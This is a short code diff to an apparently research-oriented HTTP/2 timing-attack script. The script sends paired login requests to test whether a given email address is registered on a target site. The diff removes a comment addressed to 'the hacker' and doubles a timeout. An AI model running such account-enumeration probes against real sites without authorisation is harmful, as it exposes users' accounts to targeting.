@@ -40,7 +40,6 @@ async def attack():
     detail_file = open("results/" + target_location + "_" + activity_type + "_detail.csv", "a")
     winners_file = open("results/" + target_location + "_" + activity_type + "_winners.csv", "a")
 
-    # This must be the email that you as the hacker want to test if exists on the site
     if activity_type == "control":
         post_data = 'password=12345789abc&email=' + ''.join(random.choices(string.ascii_uppercase + string.digits, k=6)) + '@ephort.dk'
     else:
@@ -80,7 +79,7 @@ async def attack():
             )
         
     else:
-        async with H2Time(r1, r2, num_request_pairs=num_request_pairs, num_padding_params=40, sequential=True, inter_request_time_ms=10, timeout=50) as h2t:            
+        async with H2Time(r1, r2, num_request_pairs=num_request_pairs, num_padding_params=40, sequential=True, inter_request_time_ms=10, timeout=100) as h2t:            
             results = await h2t.run_attack()
     # print(results)
     output = '\n'.join(map(lambda x: ','.join(map(str, x)), results))
